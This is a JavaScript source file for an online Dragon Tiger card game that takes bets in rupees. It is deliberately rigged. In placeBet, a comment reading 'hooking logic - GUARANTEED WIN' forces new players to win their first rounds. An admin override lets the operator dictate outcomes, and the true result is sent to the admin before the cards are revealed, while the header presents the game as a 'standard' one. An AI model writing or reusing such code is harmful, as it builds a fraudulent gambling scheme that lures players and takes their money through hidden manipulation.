// Dragon Tiger Game
// Algorithm: Standard single card comparison game
// Dragon vs Tiger - higher card wins. Tie pays 8:1

export class DragonTigerGame {
  constructor(container, app) {
    this.container = container;
    this.app = app;
    this.admin = app.adminController;
    this.isPlaying = false;
    this.history = [];
    this.suits = ['♠', '♥', '♦', '♣'];
    this.suitColors = { '♠': '#fff', '♥': '#ef4444', '♦': '#ef4444', '♣': '#fff' };
    this.values = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
    this.timer = null;
    this.countdown = 15;
    this.render();
  }

  render() {
    this.container.innerHTML = `
      <div class="game-page">
        <div class="game-header">
          <div class="game-header-icon">🐉</div>
          <h1>Dragon Tiger</h1>
          <p>Simple & fast card game • Dragon vs Tiger • Higher card wins</p>
        </div>

        ${this.admin.renderGamePanel('dragon-tiger')}

        <!-- History Strip -->
        <div class="aviator-history-strip" id="dt-history-strip">
          ${this.renderHistoryStrip()}
        </div>

        <div class="game-container">
          <div class="game-area">
            <div class="game-timer" id="dt-timer">
              <i class="fas fa-clock"></i> Place your bets: <span id="dt-countdown">${this.countdown}s</span>
            </div>
            
            <div class="dt-cards">
              <div class="dt-card-container">
                <div class="dt-card-label dragon">🐉 Dragon</div>
                <div class="dt-card" id="dragon-card">
                  <div class="card-back"><i class="fas fa-dragon"></i></div>
                </div>
              </div>
              <div class="dt-vs">VS</div>
              <div class="dt-card-container">
                <div class="dt-card-label tiger">🐯 Tiger</div>
                <div class="dt-card" id="tiger-card">
                  <div class="card-back"><i class="fas fa-paw"></i></div>
                </div>
              </div>
            </div>

            <div id="dt-result"></div>
          </div>

          <div class="game-controls">
            <div class="bet-amount-group">
              <div class="bet-input-wrapper">
                <span>₹</span>
                <input type="number" class="bet-amount-input" id="dt-bet-amount" value="100" min="10" max="50000" />
              </div>
              <div class="bet-quick-buttons">
                <button class="bet-quick" data-amount="50">₹50</button>
                <button class="bet-quick" data-amount="100">₹100</button>
                <button class="bet-quick" data-amount="500">₹500</button>
                <button class="bet-quick" data-amount="1000">₹1K</button>
                <button class="bet-quick" data-amount="5000">₹5K</button>
              </div>
            </div>
            <div class="bet-options">
              <button class="bet-option-btn dt-bet-dragon" id="dt-bet-dragon" ${this.isPlaying ? 'disabled' : ''}>
                🐉 Dragon (1:1)
              </button>
              <button class="bet-option-btn dt-bet-tie" id="dt-bet-tie" ${this.isPlaying ? 'disabled' : ''}>
                🤝 Tie (8:1)
              </button>
              <button class="bet-option-btn dt-bet-tiger" id="dt-bet-tiger" ${this.isPlaying ? 'disabled' : ''}>
                🐯 Tiger (1:1)
              </button>
            </div>
          </div>
        </div>

        <!-- Recent Results -->
        <div class="game-history">
          <h3><i class="fas fa-history"></i> Recent Results</h3>
          <table class="history-table">
            <thead>
              <tr>
                <th>Round</th>
                <th>Dragon</th>
                <th>Tiger</th>
                <th>Winner</th>
              </tr>
            </thead>
            <tbody id="dt-history-table">
              ${this.renderHistory()}
            </tbody>
          </table>
        </div>
      </div>
    `;

    this.setupEvents();
    this.admin.setupGamePanelEvents('dragon-tiger');
    this.startTimer();
  }

  renderHistoryStrip() {
    if (this.history.length === 0) {
      return '<span style="color: var(--text-muted); font-size: 0.8rem;">No results yet</span>';
    }
    return this.history.slice(0, 20).map(h => {
      const cls = h.winner === 'Dragon' ? 'high' : h.winner === 'Tiger' ? 'low' : 'medium';
      return `<span class="aviator-history-item ${cls}">${h.winner === 'Dragon' ? '🐉' : h.winner === 'Tiger' ? '🐯' : '🤝'} ${h.winner}</span>`;
    }).join('');
  }

  renderHistory() {
    if (this.history.length === 0) {
      return '<tr><td colspan="4" style="text-align:center; color: var(--text-muted); padding: 2rem;">Play a round to see results</td></tr>';
    }
    return this.history.slice(0, 10).map((h, i) => `
      <tr>
        <td>#${this.history.length - i}</td>
        <td>${h.dragonCard.value}${h.dragonCard.suit}</td>
        <td>${h.tigerCard.value}${h.tigerCard.suit}</td>
        <td style="font-weight: 700; color: ${h.winner === 'Dragon' ? '#ef4444' : h.winner === 'Tiger' ? '#3b82f6' : 'var(--success)'};">${h.winner}</td>
      </tr>
    `).join('');
  }

  startTimer() {
    this.countdown = 15;
    this.updateTimerDisplay();
    this.timer = setInterval(() => {
      this.countdown--;
      this.updateTimerDisplay();
      if (this.countdown <= 0) {
        clearInterval(this.timer);
      }
    }, 1000);
  }

  updateTimerDisplay() {
    const el = document.getElementById('dt-countdown');
    if (el) el.textContent = `${this.countdown}s`;
  }

  drawCard() {
    const valueIdx = Math.floor(Math.random() * 13);
    const suit = this.suits[Math.floor(Math.random() * 4)];
    return {
      value: this.values[valueIdx],
      numericValue: valueIdx + 1,
      suit: suit,
      color: this.suitColors[suit]
    };
  }

  // Draw a card that guarantees a specific outcome when compared
  drawRiggedCards(forcedWinner) {
    let dragonCard = this.drawCard();
    let tigerCard = this.drawCard();

    if (forcedWinner === 'dragon') {
      // Make dragon higher
      while (dragonCard.numericValue <= tigerCard.numericValue) {
        dragonCard = this.drawCard();
      }
    } else if (forcedWinner === 'tiger') {
      // Make tiger higher
      while (tigerCard.numericValue <= dragonCard.numericValue) {
        tigerCard = this.drawCard();
      }
    } else if (forcedWinner === 'tie') {
      // Make equal
      tigerCard = { ...dragonCard, suit: this.suits[Math.floor(Math.random() * 4)] };
      tigerCard.color = this.suitColors[tigerCard.suit];
    }

    return { dragonCard, tigerCard };
  }

  revealCard(elementId, card, delay = 0) {
    const cardEl = document.getElementById(elementId);
    setTimeout(() => {
      cardEl.innerHTML = `
        <div style="display:flex; flex-direction:column; justify-content:space-between; height:100%; padding:0.4rem;">
          <div style="color: ${card.color}; font-weight: 800; font-family: 'Times New Roman', serif; font-size:1.5rem; line-height:1; text-align:left;">
            ${card.value}
          </div>
          <div style="color: ${card.color}; font-size: 3.5rem; text-align: center; text-shadow: 0 4px 6px rgba(0,0,0,0.1);">
            ${card.suit}
          </div>
          <div style="color: ${card.color}; font-weight: 800; font-family: 'Times New Roman', serif; font-size:1.5rem; transform: rotate(180deg); line-height:1; text-align:left;">
            ${card.value}
          </div>
        </div>
      `;
      cardEl.classList.add('revealed');
      cardEl.style.background = '#ffffff';
      cardEl.style.color = '#000000';
      cardEl.style.border = '1px solid #d1d5db';
      cardEl.style.boxShadow = '0 10px 15px -3px rgba(0, 0, 0, 0.4), 0 4px 6px -2px rgba(0, 0, 0, 0.2)';
    }, delay);
  }

  placeBet(side) {
    if (this.isPlaying) return;

    // Check if user is logged in before allowing bet
    if (!this.app.userManager.isLoggedIn()) {
      this.app.toastManager.show('Please login to place bets', 'warning');
      this.app.openModal('login-modal');
      return;
    }

    // Check if user is banned
    if (this.app.userManager.isBanned()) {
      this.app.toastManager.show('Your account has been suspended. Contact admin.', 'error');
      return;
    }

    const betAmount = parseFloat(document.getElementById('dt-bet-amount').value);
    if (!betAmount || betAmount < 10) {
      this.app.toastManager.show('Minimum bet is ₹10', 'warning');
      return;
    }

    if (!this.app.walletManager.placeBet(betAmount, 'Dragon Tiger')) {
      this.app.toastManager.show('Insufficient balance!', 'error');
      return;
    }

    this.app.updateWalletDisplay();
    this.isPlaying = true;
    clearInterval(this.timer);

    // Register live bet for Admin Dashboard
    const user = this.app.userManager.getUser();
    if (user) {
      this.app.adminController.addLiveBet('dragon-tiger', user.username || user.name, betAmount, side);
    }

    // Disable buttons
    document.getElementById('dt-result').textContent = 'Dealing...';
    document.getElementById('dragon-card').innerHTML = '';
    document.getElementById('tiger-card').innerHTML = '';
    
    // First 2 games hooking logic - GUARANTEED WIN
    let forceWinChoice = null;
    if (user && this.app.walletManager.getGamePlayCount(user.id, 'Dragon Tiger') <= 2) {
      forceWinChoice = side.toLowerCase(); // 'dragon', 'tiger', or 'tie'
    }

    // Determine result
    // Order of precedence: 1. Admin Override  2. Initial Hook Win  3. Random
    const override = this.admin.getOverride('dragonTiger');
    const forcedWinner = override || forceWinChoice;
    
    let dragonCard, tigerCard;
    if (forcedWinner) {
      const rigged = this.drawRiggedCards(forcedWinner);
      dragonCard = rigged.dragonCard;
      tigerCard = rigged.tigerCard;
      if (override) this.admin.clearOverride('dragonTiger');
    } else {
      dragonCard = this.drawCard();
      tigerCard = this.drawCard();
    }
    
    // Show admin the outcome before reveal
    const winner = dragonCard.numericValue > tigerCard.numericValue ? 'Dragon'
      : tigerCard.numericValue > dragonCard.numericValue ? 'Tiger' : 'Tie';
    this.admin.setPrediction('dragon-tiger', `${winner} (D:${dragonCard.value}${dragonCard.suit} T:${tigerCard.value}${tigerCard.suit})`);

    setTimeout(() => {
      this.revealCard('dragon-card', dragonCard);
    }, 800);

    setTimeout(() => {
      this.revealCard('tiger-card', tigerCard);
    }, 1600);

    setTimeout(() => {
      this.resolveRound(side, betAmount, dragonCard, tigerCard);
    }, 2200);
  }

  resolveRound(side, betAmount, dragonCard, tigerCard) {
    let winner;
    if (dragonCard.numericValue > tigerCard.numericValue) {
      winner = 'Dragon';
    } else if (tigerCard.numericValue > dragonCard.numericValue) {
      winner = 'Tiger';
    } else {
      winner = 'Tie';
    }

    // Calculate winnings
    let winAmount = 0;
    let won = false;

    if (side === 'Tie' && winner === 'Tie') {
      winAmount = betAmount * 9; // 8:1 + original bet
      won = true;
    } else if (side === winner) {
      winAmount = betAmount * 2; // 1:1 + original bet
      won = true;
    }

    if (won) {
      this.app.walletManager.addWinnings(winAmount, 'Dragon Tiger');
      this.app.updateWalletDisplay();
      document.getElementById('dt-result').innerHTML = `
        <div class="game-result win">
          🎉 ${winner} wins! You won ₹${winAmount.toLocaleString()}!
        </div>
      `;
      this.app.toastManager.show(`You won ₹${winAmount.toLocaleString()}!`, 'success');
    } else {
      document.getElementById('dt-result').innerHTML = `
        <div class="game-result lose">
          ${winner} wins. You lost ₹${betAmount.toLocaleString()}.
        </div>
      `;
    }

    // Add to history
    this.history.unshift({ dragonCard, tigerCard, winner });

    // Update history displays
    document.getElementById('dt-history-strip').innerHTML = this.renderHistoryStrip();
    document.getElementById('dt-history-table').innerHTML = this.renderHistory();

    // Reset for next round
    this.app.adminController.clearOverride('dragonTiger');
    this.app.adminController.clearLiveBets('dragon-tiger');
    this.isPlaying = false;
    document.querySelectorAll('.bet-option-btn').forEach(b => b.disabled = false);
    this.startTimer();
  }

  setupEvents() {
    document.getElementById('dt-bet-dragon').addEventListener('click', () => this.placeBet('Dragon'));
    document.getElementById('dt-bet-tiger').addEventListener('click', () => this.placeBet('Tiger'));
    document.getElementById('dt-bet-tie').addEventListener('click', () => this.placeBet('Tie'));

    this.container.querySelectorAll('.bet-quick').forEach(btn => {
      btn.addEventListener('click', () => {
        document.getElementById('dt-bet-amount').value = btn.dataset.amount;
      });
    });
  }

  destroy() {
    if (this.timer) clearInterval(this.timer);
  }
}
